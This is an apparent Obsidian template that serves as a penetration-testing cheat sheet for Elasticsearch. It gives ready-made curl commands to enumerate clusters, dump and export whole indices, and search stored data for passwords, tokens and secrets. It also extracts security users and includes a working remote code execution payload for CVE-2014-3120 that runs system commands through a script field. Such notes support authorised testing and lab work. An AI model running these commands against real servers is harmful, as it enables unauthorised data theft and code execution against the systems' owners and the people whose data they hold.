# Elasticsearch — Port <% tp.frontmatter.current_port %>
<%* let ip = tp.frontmatter.target_ip; let port = tp.frontmatter.current_port || 9200; let user = tp.frontmatter.username || 'elastic'; let pass = tp.frontmatter.password || '<pass>' -%>

> [!info] Elasticsearch is a search/analytics database. Older versions (< 6.x) often have **no authentication** by default. Port 9200 = HTTP API, Port 9300 = node-to-node transport.

---

## Nmap
```bash
nmap -p<% port %> --script=http-title,http-headers <% ip %>
```

---

## Basic Info / Auth Check
```bash
# Check cluster info (no auth required on older installs)
curl -sk http://<% ip %>:<% port %>/
```

```bash
# If auth required (X-Pack security)
curl -sk http://<% ip %>:<% port %>/ -u '<% user %>:<% pass %>'
```

```bash
# Cluster health
curl -sk http://<% ip %>:<% port %>/_cluster/health?pretty
```

---

## Enumeration

### List Indices (databases)
```bash
curl -sk http://<% ip %>:<% port %>/_cat/indices?v
```

```bash
curl -sk http://<% ip %>:<% port %>/_cat/indices?v -u '<% user %>:<% pass %>'
```

### List All Indices (JSON)
```bash
curl -sk http://<% ip %>:<% port %>/_aliases?pretty
```

### Cluster Nodes
```bash
curl -sk http://<% ip %>:<% port %>/_cat/nodes?v
```

### Cluster Settings
```bash
curl -sk http://<% ip %>:<% port %>/_cluster/settings?pretty
```

---

## Dump Data

### List Documents in Index
```bash
curl -sk http://<% ip %>:<% port %>/<index>/_search?pretty
```

```bash
# Get first 100 docs
curl -sk http://<% ip %>:<% port %>/<index>/_search?size=100\&pretty
```

```bash
# Count documents
curl -sk http://<% ip %>:<% port %>/<index>/_count
```

### Export All Data from Index
```bash
# With elasticdump
elasticdump --input=http://<% ip %>:<% port %>/<index> --output=./dump.json --type=data
```

```bash
# Using scroll API for large datasets
curl -sk http://<% ip %>:<% port %>/<index>/_search?scroll=1m -H 'Content-Type: application/json' -d '{"size": 1000, "query": {"match_all": {}}}'
```

---

## User / Credential Search
```bash
# Search for sensitive data patterns
curl -sk "http://<% ip %>:<% port %>/_search?q=password&pretty"
curl -sk "http://<% ip %>:<% port %>/_search?q=username&pretty"
curl -sk "http://<% ip %>:<% port %>/_search?q=secret&pretty"
curl -sk "http://<% ip %>:<% port %>/_search?q=token&pretty"
curl -sk "http://<% ip %>:<% port %>/_search?q=email&pretty"
```

```bash
# List all indices and dump any that look interesting
for idx in $(curl -sk http://<% ip %>:<% port %>/_cat/indices?h=index); do
  echo "=== $idx ==="
  curl -sk "http://<% ip %>:<% port %>/$idx/_search?size=5&pretty"
done
```

---

## X-Pack Security — Dump Users
```bash
# If security is enabled, extract built-in users
curl -sk http://<% ip %>:<% port %>/_security/user -u '<% user %>:<% pass %>' | python3 -m json.tool
```

---

## RCE via MVEL/Groovy Script (CVE-2014-3120, CVE-2015-1427 — Elasticsearch < 1.6)
```bash
# CVE-2014-3120 — dynamic scripts enabled by default in < 1.3.8
curl -s http://<% ip %>:<% port %>/_search?pretty -d '{
  "script_fields": {
    "cmd": {
      "script": "import java.util.*;import java.io.*;new java.util.Scanner(Runtime.getRuntime().exec(\"id\").getInputStream()).useDelimiter(\"\\\\A\").next()"
    }
  }
}'
```

---

## Kibana (often on port 5601)
```bash
# Check for Kibana alongside Elasticsearch
curl -sk http://<% ip %>:5601/api/status
```

> [!tip] If Kibana is accessible without auth, it gives full access to all Elasticsearch data through a GUI.

---

## Config Locations
```
/etc/elasticsearch/elasticsearch.yml    — main config
/etc/elasticsearch/jvm.options          — JVM options
/var/log/elasticsearch/                 — logs
/var/lib/elasticsearch/                 — data directory
```

```bash
# Key config items to look for:
grep -i "xpack.security.enabled\|network.host\|http.host" /etc/elasticsearch/elasticsearch.yml
# xpack.security.enabled: false = NO AUTH
```

---

## Notes
